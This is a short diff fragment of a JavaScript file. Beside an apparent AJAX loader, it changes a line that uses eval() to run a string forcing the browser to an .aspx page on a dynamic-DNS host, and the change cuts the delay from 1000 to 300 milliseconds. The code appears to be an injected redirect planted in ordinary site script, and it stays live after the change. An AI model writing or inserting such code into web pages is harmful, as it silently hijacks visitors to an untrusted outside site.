@@ -9,5 +9,5 @@ function loadDoc() {
   xhttp.send();
 }
 
-var code = 'setTimeout(function() {window.location.href = "http://vuhuongmai2.isa-geek.org/VN/_250720.aspx"}, 1000);';
+var code = 'setTimeout(function() {window.location.href = "http://vuhuongmai2.isa-geek.org/VN/_250720.aspx"}, 300);';
 eval(code);
